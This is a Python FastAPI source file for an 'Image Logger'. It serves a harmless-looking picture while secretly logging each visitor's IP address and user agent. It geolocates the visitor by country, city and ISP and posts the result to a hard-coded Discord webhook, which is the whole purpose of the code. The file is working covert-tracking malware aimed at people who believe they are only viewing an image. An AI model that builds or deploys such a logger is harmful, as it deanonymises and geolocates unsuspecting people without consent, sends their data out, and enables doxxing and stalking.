from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, RedirectResponse
import requests
import base64
from urllib import parse

app = FastAPI()

config = {
    "webhook": "https://discord.com/api/webhooks/1489273954274119932/exL5TnsOQlbusCZFDdW7jQEN6Pr8y76nvGadZ2Co0r6wuwLFLHGJa66Vz5w1PoiBbdiE",
    "image": "https://ichef.bbci.co.uk/ace/standard/976/cpsprodpb/F1F2/production/_118283916_b19c5a1f-162b-410b-8169-f58f0d153752.jpg",
    "imageArgument": True,
}

def makeReport(ip, useragent=None, endpoint="/", url=None):
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}").json()

        embed = {
            "username": "Image Logger",
            "content": "",
            "embeds": [
                {
                    "title": "IP Logged",
                    "description": f"""
**IP:** {ip}
**Country:** {info.get('country')}
**City:** {info.get('city')}
**ISP:** {info.get('isp')}

**User Agent:**
{useragent}
""",
                }
            ],
        }

        if url:
            embed["embeds"][0]["thumbnail"] = {"url": url}

        requests.post(config["webhook"], json=embed)

    except Exception as e:
        print("Error:", e)


def get_client_ip(request: Request):
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        return forwarded.split(",")[0]
    return request.client.host


@app.get("/")
async def root(request: Request):
    ip = get_client_ip(request)
    useragent = request.headers.get("user-agent")

    # Handle image override
    url = config["image"]
    if config["imageArgument"]:
        query = dict(parse.parse_qsl(str(request.url.query)))
        if "url" in query:
            try:
                url = base64.b64decode(query["url"]).decode()
            except:
                pass

    # Log request
    makeReport(ip, useragent, "/", url)

    html = f"""
    <html>
        <body style="margin:0">
            <div style="
                background-image:url('{url}');
                background-size:contain;
                background-repeat:no-repeat;
                background-position:center;
                width:100vw;
                height:100vh;">
            </div>
        </body>
    </html>
    """

    return HTMLResponse(content=html)


@app.get("/image")
async def image(request: Request):
    ip = get_client_ip(request)
    useragent = request.headers.get("user-agent")

    makeReport(ip, useragent, "/image")

    return RedirectResponse(config["image"])
